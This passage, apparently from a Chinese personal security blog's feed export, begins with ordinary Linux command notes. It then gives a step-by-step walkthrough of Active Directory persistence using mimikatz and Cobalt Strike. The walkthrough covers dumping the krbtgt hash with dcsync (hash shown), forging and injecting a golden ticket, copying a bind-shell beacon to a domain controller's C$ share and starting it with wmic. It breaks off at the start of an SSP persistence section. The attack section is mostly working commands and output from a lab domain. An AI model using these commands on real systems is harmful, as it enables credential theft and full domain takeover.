class="comment">#存储用户账号</span></span><br><span class="line">/etc/group         <span class="comment">#存储组账号</span></span><br><span class="line">/etc/shadow        <span class="comment">#存储用户组账号的密码</span></span><br><span class="line">useradd temouser    <span class="comment">#创建用户，只增加一个用户</span></span><br><span class="line">-s   <span class="comment">#指定登录 shell</span></span><br><span class="line">userdel            <span class="comment">#用户名，删除一个用户</span></span><br><span class="line">-r <span class="comment">#删除用户，并删除家目录和邮件</span></span><br><span class="line">adduser            <span class="comment">#用户名，增加一个用户（自动创建家目录）</span></span><br><span class="line">groupadd           <span class="comment">#组名，创建一个组</span></span><br><span class="line">groupdel           <span class="comment">#组名，删除一个组</span></span><br><span class="line">passwd   <span class="comment">#修改当前用户密码</span></span><br><span class="line">passwd root        <span class="comment">#给root设置密码</span></span><br><span class="line"></span><br><span class="line">su<span class="comment">#更改用户 ID 或成为超级用户</span></span><br><span class="line">su +创建的用户名    <span class="comment">#切换到此用户</span></span><br><span class="line">sudo <span class="built_in">cat</span> /etc/sudoers<span class="comment">#以超级用户权限执行cat命令</span></span><br><span class="line">sudo -l<span class="comment">#显示在kali用户下哪些命令可以sudo</span></span><br></pre></td></tr></table></figure><h3 id="修改密码：su-passwd-root"><a href="#修改密码：su-passwd-root" class="headerlink" title="修改密码：su passwd root"></a>修改密码：su passwd root</h3><blockquote><p>原文链接：<a href="https://blog.csdn.net/qq_28120227/article/details/100677167">https://blog.csdn.net/qq_28120227/article/details/100677167</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root用户登录时，运行passwd 命令，可以设置或修改任何用户的密码</span><br><span class="line">语法格式：</span><br><span class="line"># passwd 用户名</span><br><span class="line">passwd命令后不加用户名，表示修改当前用户的密码。</span><br><span class="line">输入新密码即可，无需重启Linux系统。</span><br></pre></td></tr></table></figure><h3 id="修改主机名-hostname-alvin"><a href="#修改主机名-hostname-alvin" class="headerlink" title="修改主机名:hostname alvin"></a>修改主机名:hostname alvin</h3><h2 id="文件权限及属性操作命令"><a href="#文件权限及属性操作命令" class="headerlink" title="文件权限及属性操作命令"></a>文件权限及属性操作命令</h2><h3 id="常用权限"><a href="#常用权限" class="headerlink" title="常用权限"></a>常用权限</h3><blockquote><p><a href="https://m.runoob.com/linux/linux-comm-chown.html">chown命令</a></p></blockquote><p>用ll命令列出来所有文件的权限，一般而言，你是什么用户创建的文件，其文件所属用户就对应于对应用户</p><p>Linux里面的权限控制及其细分，注意组的权限和个人权限，即使文件没有个人权限，如果所属组有权限，那么也是可以执行的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r：4</span><br><span class="line">w：2</span><br><span class="line">x：1</span><br><span class="line">属主：u（user）</span><br><span class="line">数组：g（group）</span><br><span class="line">其他：o（other）</span><br><span class="line"><span class="built_in">chmod</span> u+x <span class="built_in">test</span>                        <span class="comment">#chmod    change mode</span></span><br><span class="line"><span class="built_in">chown</span> root.root <span class="built_in">test</span>                  <span class="comment">#chown    change owner    root，root前面的是用户，后面的是组</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">    -rw-r--r--  1 kali kali 11759  2月 23 05:36 .face</span><br><span class="line">    lrwxrwxrwx  1 kali kali     5  2月 23 05:36 .face.icon -&gt; .face</span><br><span class="line">    drwx------  3 kali kali  4096  3月 31 06:00 .gnupg</span><br><span class="line">-开头表示这是一个文件</span><br><span class="line">l开头表示这是一个链接</span><br><span class="line">d开头表示这是一个目录</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211111610246.png" alt="image-20220818094710630" style="zoom:50%;" /><h3 id="其他权限"><a href="#其他权限" class="headerlink" title="其他权限"></a>其他权限</h3><p>除了读写执行权限外系统还支持强制位（s权限）和粘滞位（t权限）</p><h4 id="s权限"><a href="#s权限" class="headerlink" title="s权限"></a><strong>s权限</strong></h4><h5 id="s权限简介："><a href="#s权限简介：" class="headerlink" title="s权限简介："></a>s权限简介：</h5><p>s即（SUID,Set UID）。设置使文件在执行阶段具有文件所有者的权限，相当于临时拥有文件所有者的身份. 典型的文件是passwd. 如果一般用户执行该文件, 则在执行过程中, 该文件可以获得root权限, 从而可以更改用户的密码.</p><p>可执行的文件搭配这个权限，便能得到特权，任意存取该文件的所有者能使用的全部系统资源。请注意具备SUID权限的文件，黑客经常利用这种权限，以SUID配上root帐号拥有者，无声无息地在系统中开扇后门，供日后进出使用。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 pythontab pythontab 32988 2018-03-16 14:25 /usr/bin/passwd</span><br></pre></td></tr></table></figure><h5 id="设置s权限"><a href="#设置s权限" class="headerlink" title="设置s权限"></a>设置s权限</h5><ul><li>我们可以通过<strong>字符模式</strong>设置s权限</li></ul><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod a+s filename</span><br></pre></td></tr></table></figure></blockquote><ul><li>也可以使用<strong>绝对模式</strong>进行设置：</li></ul><blockquote><ul><li>设置suid：将相应的权限位之前的那一位设置为4；</li><li>设置guid：将相应的权限位之前的那一位设置为2；</li><li>两者都置位：将相应的权限位之前的那一位设置为4+2&#x3D;6。</li></ul></blockquote><p>注意：在设置s权限时文件属主、属组必须先设置相应的x权限，否则s权限并不能正真生效（chmode命令不进行必要的完整性检查，即使不设置x权限就设置s权限，chmod也不会报错，当我们ls -l时看到rwS，大写S说明s权限未生效）</p><h4 id="t权限"><a href="#t权限" class="headerlink" title="t权限"></a><strong>t权限</strong></h4><p>t权限：要删除一个文档，您不一定要有这个文档的写权限，但您一定要有这个文档的上级目录的写权限。也就是说，您即使没有一个文档的写权限，但您有这个文档的上级目录的写权限，也能够把这个文档给删除，而假如没有一个目录的写权限，也就不能在这个目录下创建文档。</p><p>怎样才能使一个目录既能够让任何用户写入文档，又不让用户删除这个目录下他人的文档，t权限就是能起到这个作用。t权限一般只用在目录上，用在文档上起不到什么作用。</p><p>在一个目录上设了t权限位后，（如&#x2F;home，权限为1777)任何的用户都能够在这个目录下创建文档，但只能删除自己创建的文档(root除外)，这就对任何用户能写的目录下的用户文档 启到了保护的作用。</p><p>可以通过chmod +t filename 来设置t权限</p><blockquote><p>注：&#x2F;tmp和 &#x2F;var&#x2F;tmp目录供所有用户暂时存取文件，亦即每位用户皆拥有完整的权限进入该目录，去浏览、删除和移动文件。</p></blockquote><h2 id="常用-测试-命令"><a href="#常用-测试-命令" class="headerlink" title="常用 测试 命令"></a>常用 测试 命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping#网络连通性测试工具</span><br><span class="line">-c #N 发送 N 个数据包</span><br><span class="line">wget#一个非交互的网络下载工具</span><br><span class="line">    -b #后台下载</span><br><span class="line">    -O #path 保存到指定目录</span><br><span class="line">hexdump#以多种格式显示文件</span><br><span class="line">-C #以 ASCLL 查看</span><br><span class="line">ssh root@192.168.1.100 #登录远程计算机</span><br><span class="line">shutdown #关闭，重启计算机</span><br><span class="line">    -h #关闭计算机</span><br><span class="line">    -r #重新启动计算机</span><br><span class="line">shutdown -h 0(now) #立刻关闭计算机</span><br></pre></td></tr></table></figure><h2 id="进程-管理-命令"><a href="#进程-管理-命令" class="headerlink" title="进程 管理 命令"></a>进程 管理 命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps<span class="comment">#显示在本地机器上当前运行的进程列表</span></span><br><span class="line">top<span class="comment">#动态查看进程信息</span></span><br><span class="line">ps aux<span class="comment">#查看所有进程</span></span><br><span class="line"><span class="built_in">kill</span><span class="comment">#给进程发送一个信号</span></span><br><span class="line"><span class="built_in">kill</span> -9 1024<span class="comment">#关闭 PID 为 1024 的进程</span></span><br><span class="line">service<span class="comment">#管理系统中的服务</span></span><br><span class="line">service apache2 status <span class="comment">#查看服务状态</span></span><br><span class="line">service apache2 stop|start <span class="comment">#停止|启动服务</span></span><br><span class="line">pidof bash<span class="comment">#找到正在运行的bash程序的进程ID</span></span><br></pre></td></tr></table></figure><h2 id="systemctl和service命令"><a href="#systemctl和service命令" class="headerlink" title="systemctl和service命令"></a><code>systemctl</code>和<code>service</code>命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service和systemctl    #服务</span><br><span class="line">service &lt;service&gt; restart</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重新启动指定的系统服务&lt;service&gt;</span></span><br><span class="line">service &lt;service&gt; start</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动指定的系统服务&lt;service&gt;</span></span><br><span class="line">service &lt;service&gt; stop</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">停止指定的系统服务&lt;service&gt;</span></span><br><span class="line">service &lt;service&gt; status</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看某项服务是否开启</span></span><br><span class="line">update-rc.d &lt;服务&gt; enable</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将某项服务加入到开机自启，</span></span><br><span class="line">update-rc.d &lt;服务&gt; disable</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将某项服务移出开机自启，</span></span><br><span class="line">update-rc.d &lt;服务&gt; enable 5</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将某项服务加入到开机自启，并设置启动的优先级</span></span><br><span class="line">systemctl restart network</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启网卡</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">以对网络操作为例</span></span><br><span class="line">service network-manager restart</span><br><span class="line">service networking restart  #重启</span><br><span class="line">service networking start    #启动</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">见start改为stop即为停止</span></span><br><span class="line">service networking status   #查看网络状态</span><br><span class="line">service networking stop     #停止</span><br><span class="line">systemctl restart networking#重启</span><br></pre></td></tr></table></figure><h2 id="网络-管理-命令"><a href="#网络-管理-命令" class="headerlink" title="网络 管理 命令"></a>网络 管理 命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat<span class="comment">#显示网络统计信息，TCP/IP 网络连接等</span></span><br><span class="line">    -a <span class="comment">#显示所有连接</span></span><br><span class="line">    -n <span class="comment">#禁止解析 IP 地址和端口号</span></span><br><span class="line">    -t <span class="comment">#显示 TCP 连接</span></span><br><span class="line">ifconfig<span class="comment">#管理网络适配器</span></span><br><span class="line">ifconfig eth0 192.168.1.100 netmask 255.255.255.0<span class="comment">#给 eth0 配置 IP 地址和子网掩码</span></span><br><span class="line"></span><br><span class="line">route  <span class="comment">#查看路由.查看路由的网关，默认是192.168.1.1，一般来说都是网段的第一号ip</span></span><br></pre></td></tr></table></figure><h2 id="系统信息-查询-命令"><a href="#系统信息-查询-命令" class="headerlink" title="系统信息 查询 命令"></a>系统信息 查询 命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whoami#显示当前登录账户</span><br><span class="line">who#连接终端类型和身份</span><br><span class="line">uname#输出系统信息</span><br><span class="line">    -a #显示所有信息</span><br><span class="line">    -r #显示内核的发行版本号</span><br><span class="line">uptime#查看负载信息    </span><br><span class="line">free#内存使用情况</span><br><span class="line">last#历史登录记录情况</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看CPU 架构</span></span><br><span class="line">uname -a    </span><br><span class="line">lsb_release -d    #命令可以查看Linux 系统的发行版本</span><br><span class="line">lsb_release -cs</span><br></pre></td></tr></table></figure><h2 id="统计-查找-命令"><a href="#统计-查找-命令" class="headerlink" title="统计 查找 命令"></a>统计 查找 命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用于查找文件。该指令会在特定目录中查找符合条件的文件。该指令只能用于查找二进制文件、源代码文件和man手册页，一般文件的定位需使用locate命令。</span></span><br><span class="line">whereis   </span><br><span class="line"><span class="built_in">where</span> <span class="built_in">ls</span>        <span class="comment">#可以显示出ls命令所在目录</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#在文件系统中搜索某文件</span></span><br><span class="line">find +文件名+目录     </span><br><span class="line"></span><br><span class="line"><span class="comment">#统计文本中行数、字数、字符数</span></span><br><span class="line">WC      </span><br><span class="line"></span><br><span class="line"><span class="comment">#在文本文件中查找某个字符串，find和grep可以组合使用，通过|符号，在这个符号左右的命令互不干扰，一起执行</span></span><br><span class="line">grep    </span><br><span class="line"><span class="comment">#从根目录开始查找所有包含passwd字段的地方</span></span><br><span class="line">find / |grep passwad</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看命令帮助手册</span></span><br><span class="line">man <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><h2 id="其他常见命令"><a href="#其他常见命令" class="headerlink" title="其他常见命令"></a>其他常见命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">验证安装,使配置生效</span></span><br><span class="line">source /etc/profile       </span><br></pre></td></tr></table></figure><h1 id="Linux技巧"><a href="#Linux技巧" class="headerlink" title="Linux技巧"></a>Linux技巧</h1><ol><li>双击tab自动补全</li><li>[root@localhost ~]这就是Liux系统的命令提示符那么，这个提示符的含义是什么呢？</li></ol><blockquote><ul><li>​    []:这是提示符的分隔符号，没有特殊含义。</li><li>​    root:显示的是当前的登录用户，笔者现在使用的是root用户登录。</li><li>​    @:分隔符号，没有特殊含义。</li><li>​    localhost:当前系统的简写主机名（完整主机名是localhost..localdomain)。</li><li>​    ~:代表用户当前所在的目录，此例中用户当前所在的目录是家目录。</li><li>​    #：命令提示符，Liux用这个符号标识登录的用户权限等级。如果是超级用户，提示符就是#；如果是普通用户提示符就是$。</li></ul></blockquote><ol start="2"><li><p>linux所有用户都对tmp目录有绝对的控制权，提权一般在此进行</p></li><li><p>找不到netstat命令时，安装net-tools</p></li><li><p>windows下停止dos命令运行的操作是ctrl+z，linux下停止命令运行的操作是ctrl+c</p></li><li><p>在kali用户下许多操作都可以进行，比如说是复制粘贴，但如果是root用户下，就会搞不了</p></li><li><p>有的apt包没有 要换成其他源</p></li><li><p>对于git如果https克隆不下来，就将https改成git，就可以克隆</p></li><li><p>history命令查看历史使用的命令，！123，即！+数字，选取你要使用的命令</p></li><li><p>cls清屏、shift+insert粘贴</p></li><li><p>journalctl -xe查看报错的具体过程详细信息</p></li><li><p>（tee从标准输入读取数据并重定向到标准输出和文件。）</p></li><li><p>kali终端中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctrl+shift++#终端变大</span><br><span class="line">ctrl+-#终端变小</span><br></pre></td></tr></table></figure></li><li><p>Kali自行设置快捷键匹配相应的命令：</p><blockquote><p>参考：<a href="https://blog.csdn.net/sinat_16643223/article/details/109479507">https://blog.csdn.net/sinat_16643223/article/details/109479507</a></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208262002218.png" alt="image-20220826200253033" style="zoom:50%;" /></li></ol><h1 id="Linux知识"><a href="#Linux知识" class="headerlink" title="Linux知识"></a>Linux知识</h1><h2 id="Linux文件时间戳"><a href="#Linux文件时间戳" class="headerlink" title="Linux文件时间戳"></a>Linux文件时间戳</h2><p>Linux中的文件具有三个时间戳：</p><ol><li>atime（访问时间）-上一次通过某些命令或应用程序（例如<code>cat</code>，<a href="https://link.zhihu.com/?target=https://linux265.com/soft/3854.html">vim</a>或<code>grep</code>）访问&#x2F;打开文件的时间。</li><li>mtime（修改时间）-上次修改文件内容的时间。</li><li>ctime（更改时间）-文件的属性或内容上次更改的时间。 该属性包括文件许可权，文件所有权或文件位置。 要显示文件状态（包括时间戳），请使用<code>stat</code>命令。</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell stat file_name</span><br></pre></td></tr></table></figure><p>创建新文件需要在父目录上具有写权限。 否则，您将收到一个权限被拒绝的错误。</p><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><blockquote><p><a href="https://www.cnblogs.com/fps2tao/p/10042553.html">linux如何查看端口被哪个进程占用</a></p><p><a href="https://www.cnblogs.com/lemon-flm/p/7396536.html">Linux的netstat查看端口是否开放见解（0.0.0.0与127.0.0.1的区别）</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 常用命令 </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x32 - 域内权限维持</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x32-%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x32-%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>当我们进入域内的时候，若是域内存在一些漏洞，可以提权为域控还好，若是都打上补丁，那么就比较麻烦，需要留下后门，防止失去我们所获得的域控权限</p><h1 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h1><blockquote><p>pass the ticket</p></blockquote><h2 id="黄金票据伪造原理（具体查看前面的域内认证流程）"><a href="#黄金票据伪造原理（具体查看前面的域内认证流程）" class="headerlink" title="黄金票据伪造原理（具体查看前面的域内认证流程）"></a>黄金票据伪造原理（具体查看前面的域内认证流程）</h2><blockquote><p>参考前面的文章：<a href="https://11pmsleep.github.io/2022-08-17-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/0x25-Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/">Windows 密码凭证获取</a></p></blockquote><blockquote><p>2.2 AS确认Client端登录者用户身份</p></blockquote><p>KDC  返回的 Msg B ：使用 TGS 密钥( KDC HASH &#x2F; KRBTGT用户NTLM HASH ) 加密的TGT ( Ticket-Granting-Ticket )，当我们获取到 krbtgt 用户的 NTLM 哈希后，便可主动使用 krbtgt 用户的 NTLM 哈希做为 TGS 密钥来生成 TGT 发送给 KDC ，这样 KDC如果通过解密伪造 TGT 获取到伪造的 [CLIENT&#x2F;TGS SESSIONKEY]  可以成功解密 Authenticator 1  并完成与 TGT 中的数据进行比对，便成功骗过了 KDC ，也就是成功伪造了黄金票据</p><h2 id="黄金票据伪造条件"><a href="#黄金票据伪造条件" class="headerlink" title="黄金票据伪造条件"></a>黄金票据伪造条件</h2><ol><li>域名称</li><li>域的SID值</li><li>域的 KRBTGT 账户密码 HASH</li><li>伪造用户名，可以是任意的</li></ol><h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><ol><li>获取域名称（GUNGNIR.top）</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#beacon</span></span><br><span class="line">shell <span class="built_in">whoami</span></span><br><span class="line"><span class="comment">#gungnir\bob</span></span><br></pre></td></tr></table></figure><ol start="2"><li>域SID</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#beacon</span></span><br><span class="line">shell <span class="built_in">whoami</span> /all</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line">用户名      SID                                          </span><br><span class="line">=========== =============================================</span><br><span class="line">gungnir\bob S-1-5-21-4197607899-2616046475-783702130-1106</span><br><span class="line"></span><br><span class="line"><span class="comment">#以查询出的S-1-5-21-4197607899-2616046475-783702130-1106为例</span></span><br><span class="line"><span class="comment">#后面需要填写的域sid：S-1-5-21-4197607899-2616046475-783702130</span></span><br><span class="line"><span class="comment">#域id并不需要携带rid 1006</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：在工作组下面也有SID——安全标识符（<strong>S</strong>ecurity <strong>Id</strong>entify）。为<strong>域</strong>或<strong>本地计算机</strong>中创建的每个帐户分配的唯一 ID 字符串（例如，S-1-5-21-1963647555-2248327119-2118898007-1001）。</p><p>1001就是用户的RID</p></blockquote><ol start="3"><li>域krbtgt账户ntlm hash或aes-256值</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#beacon，使用mimkatz的dcsync模块</span></span><br><span class="line">mimikatz lsadump::dcsync /user:krbtgt@GUNGNIR.top</span><br><span class="line"><span class="comment">#如果hashdump失败，，可能是目标机器运行不了mimikatz</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#结果，注意其Hash NTLM</span></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   : </span><br><span class="line">Password last change : 2022/6/29 21:48:46</span><br><span class="line">Object Security ID   : S-1-5-21-4197607899-2616046475-783702130-502</span><br><span class="line">Object Relative ID   : 502</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: 5b0d5ce2aca63048b983a26e5c49cec2</span><br><span class="line">    ntlm- 0: 5b0d5ce2aca63048b983a26e5c49cec2</span><br><span class="line">    lm  - 0: 6e2b8af8eb15e14ba4934695725f0e9a</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">域渗透——DCSync</a>原理讲解</p></blockquote><ol start="4"><li>清理所有票据</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看所有缓存的票据，klist是系统内置命令</span><br><span class="line">shell klist</span><br><span class="line">#清除</span><br><span class="line">shell klist purge</span><br><span class="line">#或者是使用mimikatz清除</span><br><span class="line">mimikatz kerberos::purge</span><br></pre></td></tr></table></figure><ol start="5"><li>mimikatz伪造指定用户的票据并注入内存</li></ol><blockquote><p>cs使用图形化界面进行票据伪造</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209070105662.png" alt="image-20220907010504250" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209070117770.png" alt="image-20220907011700645" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#实际上在beacon中可以观察到，实际上就是调用了mimikatz执行了下面的命令</span><br><span class="line"># /ptt表示pass the hash ，同样我们也可以用mimikatz进行pth操作</span><br><span class="line"></span><br><span class="line">beacon&gt; mimikatz kerberos::golden /user:administrator /domain:gungnir.top /sid:S-1-5-21-4197607899-2616046475-783702130 /krbtgt:5b0d5ce2aca63048b983a26e5c49cec2 /endin:480 /renewmax:10080 /ptt</span><br><span class="line">[*] Tasked beacon to run mimikatz&#x27;s kerberos::golden /user:administrator /domain:gungnir.top /sid:S-1-5-21-4197607899-2616046475-783702130 /krbtgt:5b0d5ce2aca63048b983a26e5c49cec2 /endin:480 /renewmax:10080 /ptt command</span><br><span class="line">[+] host called home, sent: 296050 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">User      : administrator</span><br><span class="line">Domain    : gungnir.top (GUNGNIR)</span><br><span class="line">SID       : S-1-5-21-4197607899-2616046475-783702130</span><br><span class="line">User Id   : 500</span><br><span class="line">Groups Id : *513 512 520 518 519 </span><br><span class="line">ServiceKey: 5b0d5ce2aca63048b983a26e5c49cec2 - rc4_hmac_nt      </span><br><span class="line">Lifetime  : 2022/9/7 1:18:30 ; 2022/9/7 9:18:30 ; 2022/9/14 1:18:30</span><br><span class="line">-&gt; Ticket : ** Pass The Ticket **</span><br><span class="line"></span><br><span class="line"> * PAC generated</span><br><span class="line"> * PAC signed</span><br><span class="line"> * EncTicketPart generated</span><br><span class="line"> * EncTicketPart encrypted</span><br><span class="line"> * KrbCred generated</span><br><span class="line"></span><br><span class="line">Golden ticket for &#x27;administrator @ gungnir.top&#x27; successfully submitted for current session</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#伪造成功</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin：伪造的用户名</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：SID值，注意是去掉最后一个-后面的值</span><br><span class="line">/krbtgt：krbtgt的HASH值</span><br><span class="line">/ticket：生成的票据名称</span><br></pre></td></tr></table></figure><ol start="6"><li>查看票据</li></ol><blockquote><p>注意：</p><p>当用户注销或者是beacon掉线，都会失去票据</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#直接使用mimikatz查看票据</span></span><br><span class="line">mimikatz kerberos::list</span><br><span class="line"></span><br><span class="line">[00000000] - 0x00000017 - rc4_hmac_nt      </span><br><span class="line">   Start/End/MaxRenew: 2022/9/7 1:18:30 ; 2022/9/7 9:18:30 ; 2022/9/14 1:18:30</span><br><span class="line">   Server Name       : krbtgt/gungnir.top @ gungnir.top</span><br><span class="line">   Client Name       : administrator @ gungnir.top</span><br><span class="line">   Flags 40e00000    : pre_authent ; initial ; renewable ; forwardable ; </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"><span class="comment">#或者beacon上执行</span></span><br><span class="line">shell klist</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;客户端: administrator @ gungnir.top</span></span><br><span class="line">服务器: krbtgt/gungnir.top @ gungnir.top</span><br><span class="line">Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)</span><br><span class="line">票证标志 0x40e00000 -&gt; forwardable renewable initial pre_authent </span><br><span class="line">开始时间: 9/7/2022 1:18:30 (本地)</span><br><span class="line">结束时间:   9/7/2022 9:18:30 (本地)</span><br><span class="line">续订时间: 9/14/2022 1:18:30 (本地)</span><br><span class="line">会话密钥类型: RSADSI RC4-HMAC(NT)</span><br></pre></td></tr></table></figure><ol start="7"><li>得到域控shell</li></ol><blockquote><p>伪造成域管理员用户访问域控（普通用户无法访问域控）</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#验证是否有权限访问域控</span></span><br><span class="line">shell <span class="built_in">dir</span> \\10.10.10.10\c$</span><br><span class="line"><span class="comment">#上传一个beacon到桌面,可以使用图形化界面explore&gt;file browser,也可以使用命令行。此时需要使用正向shell连接到内网的其他主机，反向shell的不行的</span></span><br><span class="line">upload F:\Haoran\桌面\Trust folder\bind4444.exe (C:\Users\BOB\Desktop\bind4444.exe)</span><br><span class="line"><span class="comment">#上传到域控</span></span><br><span class="line">shell copy C:\Users\BOB\Desktop\bind4444.exe \\10.10.10.10\c$</span><br><span class="line"><span class="comment">#执行，在域控上远程创建进程</span></span><br><span class="line">shell wmic /authority:<span class="string">&quot;kerberos:gungnir.top\DC&quot;</span> /node:<span class="string">&quot;DC&quot;</span> process call create <span class="string">&quot;cmd /c c:\bind4444.exe&quot;</span></span><br><span class="line"><span class="comment">#连接，cs提供connect命令连接tcp beacon</span></span><br><span class="line">connect 10.10.10.10 4444</span><br><span class="line"><span class="comment">#获得域控</span></span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209070208271.png" alt="image-20220907020805060"></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209070209153.png" alt="image-20220907020918987" style="zoom:33%;" /><ol start="8"><li>保存票据为文件，直接使用即可</li></ol><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#保存票据文件golden.kirbi</span></span><br><span class="line">mimikatz kerberos::golden /user:administrator /domain:de1ay.com /sid:S<span class="literal">-1-5-21-2756371121-2868759905-3853650604</span> /krbtgt:<span class="number">82</span>dfc71b72a11ef37d663047bc2088fb /ticket:golden.kirbi</span><br></pre></td></tr></table></figure><ol start="9"><li>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中</li></ol><blockquote><p>前提是票据没有过期</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入票据</span><br><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptt golden.kiribi</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure><h1 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a>SSP</h1><blockquote><p>拿到域控权限后，就可以通过这种方式来维持在域控中的权限，获取密码</p></blockquote><h2 id="SSP简介"><a href="#SSP简介" class="headerlink" title="SSP简介"></a>SSP简介</h2><p>SSP ： Security Support Provider ,一个用于身份验证的 dll。dll是动态链接库，一些公共的库文件，都可以调用<br>SSPI ： Security Support Provider Interface ， Windows  系统在执行认证操作所使用的API。 SSPI 是 SSP 的 API 接口<br>LSA ： Local Security Authority ，用于身份认证，常见进程为 lsass.exe ，特别的地方在于 <strong>LSA 是可扩展的</strong>，在系统启动的时候 SSP 会被加载到进程 lsass.exe中.这相当于我们可以自定义一个 dll ，在系统启动的时候被加载到进程lsass.exe 。</p><blockquote><ul><li>注入到该dll中就可以对该进程进行数据获取和操作</li></ul></blockquote><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>系统在启动时 SSP  这个dll会被加载到 lsass.exe  进程中,并且由于 lsa 